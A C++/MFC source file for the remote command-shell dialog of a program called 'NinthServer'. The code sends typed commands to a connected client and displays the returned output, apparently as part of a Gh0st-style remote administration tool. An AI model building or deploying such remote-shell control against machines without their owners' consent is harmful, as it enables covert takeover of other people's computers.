// CmdDialog.cpp : 实现文件
//

#include "stdafx.h"
#include "NinthServer.h"
#include "CmdDialog.h"
#include "afxdialogex.h"


// CCmdDialog 对话框

IMPLEMENT_DYNAMIC(CCmdDialog, CDialogEx)

CCmdDialog::CCmdDialog(CIOCPServer* pServer,CWnd* pParent /*=NULL*/)
	: CDialogEx(CCmdDialog::IDD, pParent)
{
	m_iocpServer	= pServer;
	m_nCurSel		= 0;
}

CCmdDialog::~CCmdDialog()
{
}

void CCmdDialog::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_edit);
	DDX_Control(pDX, IDC_EDIT2, m_cmdEdit);
}


BEGIN_MESSAGE_MAP(CCmdDialog, CDialogEx)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_EN_CHANGE(IDC_EDIT1, &CCmdDialog::OnEnChangeEdit)
END_MESSAGE_MAP()


// CCmdDialog 消息处理程序


void CCmdDialog::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	if (NULL == m_edit.m_hWnd)
	{
		return;
	}
	CRect rect;
	this->GetWindowRect(&rect);
	ScreenToClient(&rect);
	CRect edit1,edit2;
	edit1.top = rect.top;
	edit1.bottom = rect.bottom * 0.8;
	edit1.left	 = rect.left;
	edit1.right	 = rect.right;

	edit2.top = rect.top + rect.Height() * 0.8 ;
	edit2.bottom = rect.bottom;
	edit2.left	 = rect.left;
	edit2.right	 = rect.right;

	m_edit.MoveWindow(&edit1);
	m_cmdEdit.MoveWindow(&edit2);
	// TODO: 在此处添加消息处理程序代码
}


BOOL CCmdDialog::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	m_iocpServer = NULL;
	m_nCurSel = m_edit.GetWindowTextLength();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}
void CCmdDialog::Start(CIOCPServer* dwServer,void* pClient)
{
	m_iocpServer    = dwServer;
	m_Context		= (ClientContext*)pClient;
	// 通知远程控制端对话框已经打开
	DATA *pData = new DATA;
	pData->header.flag = SERVER_NEXT;
	
	m_iocpServer->Send(m_Context, (LPBYTE)pData, sizeof(DATA));

	delete pData;
	//pServer->Send(m_Context, &bToken, sizeof(BYTE));
}

void CCmdDialog::OnReceiveComplete(ClientContext *pContext)
{
	AddKeyBoardData(pContext);
	m_nReceiveLength = m_edit.GetWindowTextLength();

	return;
}

void CCmdDialog::AddKeyBoardData(ClientContext *pContext)
{
	// 最后填上0

	pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	HEADER *pHeader = (HEADER*)pContext->m_DeCompressionBuffer.GetBuffer();
	PBYTE	pData = new BYTE[pHeader->datalength];
	memcpy(pData,pContext->m_DeCompressionBuffer.GetBuffer(sizeof(HEADER)),pHeader->datalength);
	
	CString strResult(pData);
	strResult.Replace(_T("\n"), _T("\r\n"));
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(strResult);
	m_nCurSel = m_edit.GetWindowTextLength();
	delete	pData;
}

BOOL CCmdDialog::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_cmdEdit.m_hWnd)
		{
			// 			int	len = m_edit.GetWindowTextLength();
			// 			CString str;
			// 			m_edit.GetWindowText(str);
			// 			str += "\r\n";
			CString str;
			m_cmdEdit.GetWindowText(str);
			str += _T("\r\n");
			UINT nsize = str.GetLength();
			char *charcmd = new char[nsize];
			WideCharToMultiByte(CP_OEMCP,0,(LPCTSTR)str.GetBuffer(),-1,charcmd,nsize,0,false);
			m_iocpServer->Send(m_Context, (LPBYTE)charcmd, nsize);
			m_cmdEdit.SetWindowText(_T(""));
			GotoDlgCtrl( GetDlgItem(IDC_EDIT2));
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_cmdEdit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}

void CCmdDialog::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	closesocket(m_Context->m_Socket);	
	CDialog::OnClose();

	CDialogEx::OnClose();
}


void CCmdDialog::OnEnChangeEdit()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。
	int len = m_edit.GetWindowTextLength();
	if (len < m_nCurSel)
		m_nCurSel = len;

	// TODO:  在此添加控件通知处理程序代码
}
